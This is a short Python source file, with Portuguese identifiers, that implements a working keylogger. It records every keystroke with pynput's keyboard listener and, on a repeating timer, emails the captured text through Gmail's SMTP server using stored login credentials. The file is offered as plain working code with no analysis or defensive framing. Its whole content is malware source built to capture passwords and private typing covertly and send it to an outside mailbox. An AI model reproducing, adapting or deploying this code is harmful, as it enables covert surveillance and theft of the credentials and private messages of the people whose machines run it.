import smtplib
import threading
import pynput.keyboard

class Email:
    def __init__(self, email, senha):
        self.email = email
        self.senha = senha


    def auto_send(self, mensagem):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.senha)
        server.sendmail(self.email, self.email, mensagem)
        server.quit()

class Logger:
    def __init__(self, email: Email, tempo):
        self.log = []
        self.tempo = tempo
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        self.timer = None
        self.email = email

    def process_key_press(self,key):
        try:
            self.log.append(key.char)
        except AttributeError:
            if key == key.space:
                self.log.append(" ")
            else:
                self.log.append(" " + str(key) + " ")

    def report(self):
        if len(self.log) > 0:
            self.email.auto_send("".join(self.log))
        self.log.clear()
        self.timer = threading.Timer(self.tempo, self.report)
        self.timer.start()

    def start(self):
        with self.keyboard_listener:
            self.report()
            self.keyboard_listener.join()

    def stop(self):
        self.keyboard_listener.stop()
        try:
            self.timer.cancel()
        except AttributeError:
            print("Erro: Logger nao iniciado")